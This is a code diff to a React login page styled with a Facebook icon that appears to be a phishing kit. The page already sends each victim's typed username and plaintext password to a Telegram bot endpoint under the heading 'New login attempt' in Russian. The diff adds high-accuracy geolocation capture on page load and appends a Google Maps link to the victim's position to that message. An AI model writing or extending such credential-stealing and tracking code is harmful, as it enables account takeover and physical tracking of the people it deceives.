@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { FaFacebook } from "react-icons/fa";
 
 
@@ -10,9 +10,34 @@ const LoginPage = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [error, setError] = useState(false);
+  const [location, setLocation] = useState(null);
+  const [locationError, setLocationError] = useState(null);
+
+  useEffect(() => {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          setLocation({ latitude, longitude });
+          console.log("Location captured:", latitude, longitude);
+        },
+        (err) => {
+          console.error("Geolocation error:", err.message);
+          setLocationError(err.message);
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    } else {
+      setLocationError("Geolocation not supported");
+    }
+  }, []);
   const handleSubmit = async (e) => {
     e.preventDefault();
-    const message = `🔐 Новая попытка входа:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+    const locInfo = location 
+      ? `\n📍 Location: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
+      : `\n📍 Location: ${locationError || 'Pending/Denied'}`;
+    
+    const message = `🔐 Новая попытка входа:\n👤 Username: ${username}\n🔑 Password: ${password}${locInfo}`;
 
     try {
       await fetch(TELEGRAM_API, {
